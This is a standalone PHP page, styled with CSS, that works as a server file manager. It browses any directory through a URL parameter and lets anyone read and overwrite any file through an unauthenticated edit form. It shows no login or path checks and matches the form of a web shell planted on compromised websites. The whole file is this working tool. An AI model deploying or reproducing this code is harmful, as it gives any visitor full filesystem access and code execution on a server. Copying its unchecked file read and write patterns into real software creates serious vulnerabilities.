<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Yantramanav:wght@300&display=swap');
	* {
		font-family: 'Yantramanav', sans-serif;
	}
	body {
		background: rgb(248, 249, 250);
		padding-top: 10px;
		padding-bottom: 10px;
		padding-right:10px;
		padding-left:10px;
	}
	a {
		color: #000;
		text-decoration: none;
	}
	a:hover {
		background: #efefef;
	}
	.isi {
		background: #fff;
		border-radius:20px;
		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
	}
	.isi .files {
		padding-top: 20px;
		padding-left: 20px;
		padding-bottom: 20px;
		padding-right: 20px;
	}
	.isi .header {
		position: relative;
		padding-top:10px;
		padding-bottom:10px;
	}
	.isi .header .back {
		position: absolute;
		margin-top:6px;
		padding-left:10px;
		display: inline-block;
		padding-bottom:15px;
	}
	.isi .header .back a {
		padding-right:15px;
		padding-left:15px;
		padding-top:12px;
		padding-bottom: 10px;
		border-radius:50%;
		background: #ebebeb;
		color: #bdbdbd;
	}
	.isi .header .dirname {
		width:88%;
		margin-left:60px;
		display: inline-block;
		padding-left:15px;
		font-size:25px;
		overflow-x: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
	}
	.isi .header .menu {
		margin-left:15px;
		margin-top:-3px;
		position: absolute;
		display: inline-block;
		padding-right:10px;
		float: right;
	}
	.isi .header .menu button {
		padding-right:15px;
		padding-left:15px;
		padding-top:15px;
		padding-bottom: 12px;
		border-radius:50%;
		background: #ebebeb;
		color: #bdbdbd;
		outline: none;
		border: none;
	}
	.isi .files .dir {
		display: block;
		margin-bottom:1px;
		border-radius:10px;
		padding-top:3px;
		padding-right:10px;
		padding-left:10px;
		padding-bottom:3px;
	}
	.isi .files .dir:hover {
		background: #efefef;
	}
	.isi .files .dir .name {
		display: inline-block;
	}
	.isi .files .dir .name .filename {
		font-size:18px;
	}
	.isi .files .dir .icon {
		position: relative;
		display: inline-block;
	}
	.isi .files .dir .icon img {
		width:35px;
		height:35px;
	}
	.isi .files .dir .info {
		font-size: 80%;
	}
	.isi .files .dir .type {
		display: inline-block;
		color: #666;
		width:110px;
	}
	.isi .files .dir .size {
		display: inline-block;
		color: #666;
		width:110px;
	}
	.isi .files .dir .perm {
		display: inline-block;
		width:130px;
	}
	.isi .files .dir .lastupdate {
		display: inline-block;
		width:200px;
		color: #666;
	}
	.isi .files .dir .owner {
		display: inline-block;
		width:130px;
		color: #666;
	}
	.isi .files .file {
		margin-bottom:1px;
		border-radius:10px;
		padding-top:3px;
		padding-right:10px;
		padding-left:10px;
		padding-bottom:3px;
	}
	.isi .files .file:hover {
		background: #efefef;
	}
	.isi .files .file .names {
		display: inline-block;
	}
	.isi .files .file .names .filename {
		font-size:18px;
	}
	.isi .files .file .icons {
		position: relative;
		display: inline-block;
	}
	.isi .files .file .icons img {
		width:35px;
		height:35px;
	}
	.isi .files .file .info {
		font-size: 80%;
	}
	.isi .files .file .type {
		display: inline-block;
		color: #666;
		width:110px;
	}
	.isi .files .file .sizes {
		display: inline-block;
		color: #666;
		width:110px;
	}
	.isi .files .file .perms {
		display: inline-block;
		width:130px;
	}
	.isi .files .file .lastupdate {
		display: inline-block;
		width:200px;
		color: #666;
	}
	.isi .files .file .owner {
		display: inline-block;
		width:130px;
		color: #666;
	}
	.edit {
		padding:10px;
	}
	.edit .filename,
	.edit .sizefile,
	.edit .lastupdatefile,
	.edit .ownerfile {
		margin-bottom:10px;
		margin-left:3px;
	}
	.edit .isifile {
		margin-bottom:10px;
	}
	.edit .isifile textarea {
		width:100%;
		border-radius:15px;
		resize: none;
		border: 1px solid #ebebeb;
		background: #ebebeb;
		padding: 20px;
		outline: none;
		height:400px;
	}
	.submit input[type=submit] {
		width:100%;
		border: 1px solid #ebebeb;
		background: #ebebeb;
		padding:10px;
		outline: none;
		border-radius:15px;
		font-weight:bold;
		font-size:20px;
	}
	.submit input[type=submit]:hover {
		cursor: pointer;
	}
</style>
<body>
	<?php
	function files($type) {
		$array = array();
		foreach (scandir(getcwd()) as $key => $value) {
			$file['name'] = getcwd() . DIRECTORY_SEPARATOR . $value;
			switch ($type) {
				case 'dir':
					if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
					break;
				case 'file':
					if (!is_file($file['name'])) continue 2;
					break;
			}
			$file['names'] = basename($file['name']);
			$file['ftime'] = ftime($file['name']);
			$file['owner'] = owner($file['name']);
			$file['type']  = (is_dir($file['name'])) ? filetype($file['name']) : "file " . strtoupper(getext($file['name']));
			$file['size']  = (is_dir($file['name'])) ? countDir($file['name']). " items" : size($file['name']);
			$array[] = $file;
		} return $array;
	}
	function perms($filename) {
        $perms = @fileperms($filename);
        switch ($perms & 0xF000) {
            case 0xC000:
                $info = 's';
                break;
            case 0xA000:
                $info = 'l';
                break;
            case 0x8000:
                $info = 'r';
                break;
            case 0x6000:
                $info = 'b';
                break;
            case 0x4000:
                $info = 'd';
                break;
            case 0x2000:
                $info = 'c';
                break;
            case 0x1000:
                $info = 'p';
                break;
            default:
                $info = 'u';
        }
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
                    (($perms & 0x0800) ? 's' : 'x' ) :
                    (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
                    (($perms & 0x0400) ? 's' : 'x' ) :
                    (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
                    (($perms & 0x0200) ? 't' : 'x' ) :
                    (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }
    function wr($filename, $perms, $type) {
        if (is_writable($filename)) {
            switch ($type) {
                case 1:
                    print "<font color='#000'>{$perms}</font>";
                    break;
                case 2:
                    print "<font color='green'>{$perms}</font>";
                    break;
            }
        } else {
            print "<font color='red'>{$perms}</font>";
        }
    }
	function getext($filename) {
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}
	function cd($directory) {
		return chdir($directory);
	}
	function countDir($filename) {
        return @count(scandir($filename)) -2;
    }
	function size($filename) {
        if (is_file($filename)) {
            $filepath = $filename;
            if (!realpath($filepath)) {
                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            }
            $filesize = filesize($filepath);
            $array = array("TB","GB","MB","KB","Byte");
            $total = count($array);
            while ($total-- && $filesize > 1024) {
                $filesize /= 1024;
            } return round($filesize, 2) . " " . $array[$total];
        }
    }
    function owner($filename) {
        if (function_exists("posix_getpwuid")) {
            $owner = @posix_getpwuid(fileowner($filename));
            $owner = $owner['name'];
        } else {
            $owner = fileowner($filename);
        }
        if (function_exists("posix_getgrgid")) {
            $group = @posix_getgrgid(filegroup($filename));
            $group = $group['name'];
        } else {
            $group = filegroup($filename);
        } return ($owner.":".$group);
    }
    function ftime($filename) {
        return date('d M Y - H:i A', @filemtime($filename));
    }
    function geticon($filename) {
        switch (getext($filename)) {
            case 'php1':case 'php2':case 'php3':case 'php4':case 'php5':case 'php6':case 'phtml':case 'php':print('https://image.flaticon.com/icons/svg/2306/2306154.svg');break;
            case 'html':case 'htm':print('https://image.flaticon.com/icons/svg/2306/2306098.svg');break;
            case 'asp':case 'aspx':print('https://image.flaticon.com/icons/svg/2306/2306019.svg');break;
            case 'css':print('https://image.flaticon.com/icons/svg/2306/2306041.svg');break;
			case 'js':print('https://image.flaticon.com/icons/svg/2306/2306122.svg');break;
            case 'json':print('https://image.flaticon.com/icons/svg/136/136525.svg');break;
            case 'xml':print('https://image.flaticon.com/icons/svg/2306/2306209.svg');break;
            case 'py':print('https://image.flaticon.com/icons/svg/617/617531.svg');break;
            case 'zip':print('https://image.flaticon.com/icons/svg/2306/2306214.svg');break;
            case 'rar':print('https://image.flaticon.com/icons/svg/2306/2306170.svg');break;
            case 'htaccess':print('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
            case 'txt':print('https://image.flaticon.com/icons/svg/2306/2306185.svg');break;
            case 'ini':print('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
            case 'mp3':case 'm4a':case 'wav':case 'ogg':print('https://image.flaticon.com/icons/svg/2822/2822588.svg');break;
            case 'mp4':print('https://image.flaticon.com/icons/svg/2822/2822589.svg');break;
            case 'log':print('https://image.flaticon.com/icons/svg/2306/2306124.svg');break;
            case 'dat':print('https://image.flaticon.com/icons/svg/2306/2306050.svg');break;
            case 'exe':print('https://image.flaticon.com/icons/svg/2306/2306085.svg');break;
            case 'psd':print("https://image.flaticon.com/icons/svg/2306/2306166.svg");break;
            case 'apk':print('https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg');break;
            case 'yaml':print('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
            case 'md':print("https://image.flaticon.com/icons/svg/2521/2521594.svg");break;
            case 'sql':print("https://image.flaticon.com/icons/svg/2306/2306173.svg");break;
            case 'csv':print("https://image.flaticon.com/icons/svg/2306/2306046.svg");break;
            case 'xls':print("https://image.flaticon.com/icons/svg/2306/2306196.svg");break;
            case 'docs':print("https://image.flaticon.com/icons/svg/2306/2306060.svg");break;
            case 'bak':print('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
            case 'ico':print('https://image.flaticon.com/icons/svg/1126/1126873.svg');break;
            case 'png':print('https://image.flaticon.com/icons/svg/2306/2306156.svg');break;
            case 'jpg':case 'jpeg':case 'webp':print('https://image.flaticon.com/icons/svg/2306/2306117.svg');break;
            case 'svg':print('https://image.flaticon.com/icons/svg/2306/2306179.svg');break;
            case 'gif':print('https://image.flaticon.com/icons/svg/2306/2306094.svg');break;
            case 'pdf':print('https://image.flaticon.com/icons/svg/2306/2306145.svg');break;
            default:print('https://image.flaticon.com/icons/svg/833/833524.svg');break;
        }
    }
	if (isset($_GET['cd'])){cd($_GET['cd']);}
	?>
	<div class="isi">
		<div class="files">
			<div class="header">
				<div class="back">
					<a href="?cd=<?= dirname(getcwd()) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
				</div>
				<div class="dirname">
					<?= basename(getcwd()) ?>
				</div>
				<div class="menu">
					<button><i class="fa fa-bars" aria-hidden="true"></i></button>
				</div>
			</div>
			<?php
			switch (@$_GET['action']) {
				case 'edit':
				if (isset($_POST['submit'])) {
					$handle = fopen($_GET['file'], "w");
					if (fwrite($handle, $_POST['data'])) {
						print("success");
					} else {
						print("failed");
					}
				}
					?>
					<div class="edit">
						<div class="filename">
							Filename : <?= wr($_GET['file'], basename($_GET['file']), 2) ?>
						</div>
						<div class="sizefile">
							Size : <?= size($_GET['file']) ?>
						</div>
						<div class="lastupdatefile">
							Last Update : <?= ftime($_GET['file']) ?>
						</div>
						<div class="ownerfile">
							Owner : <?= owner($_GET['file']) ?>
						</div>
						<form method="post">
							<div class="isifile">
								<textarea name="data"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea>
							</div>
							<div class="submit">
								<input type="submit" name="submit" value="SAVE">
							</div>
						</form>
					</div>
					<?php
					exit();
					break;
			}
			foreach (files('dir') as $key => $dir) { ?>
				<a href="?cd=<?= $dir['name'] ?>">
					<div class="dir">
						<div class="icon">
							<img src="https://image.flaticon.com/icons/svg/715/715676.svg">
						</div>
						<div class="name">
							<div class="filename">
								<?= $dir['names'] ?>
							</div>
							<div class="info">
								<div class="type">
									<?=  $dir['type'] ?>
								</div>
								<div class="size">
									<?= $dir['size'] ?>
								</div>
								<div class="perm">
									<?= wr($dir['name'], perms($dir['name']), 2) ?>
								</div>
								<div class="lastupdate">
									<?= $dir['ftime'] ?>
								</div>
								<div class="owner">
									<?= $dir['owner'] ?>
								</div>
							</div>
						</div>
					</div>
				</a>
			<?php }
			foreach (files('file') as $key => $file) { ?>
				<div class="file">
					<a href="?cd=<?= getcwd() ?>&action=edit&file=<?= $file['name'] ?>">
						<div class="icons">
							<img src="<?= geticon($file['name']) ?>">
						</div>
						<div class="names">
							<div class="filename">
								<?= $file['names'] ?>
							</div>
							<div class="info">
								<div class="type">
									<?= $file['type'] ?>
								</div>
								<div class="sizes">
									<?= $file['size'] ?>
								</div>
								<div class="perms">
									<?= wr($file['name'], perms($file['name']), 2) ?>
								</div>
								<div class="lastupdate">
									<?= $file['ftime'] ?>
								</div>
								<div class="owner">
									<?= $file['owner'] ?>
								</div>
							</div>
						</div>
					</a>
				</div>
			<?php }
			?>
		</div>
	</div>
</body>
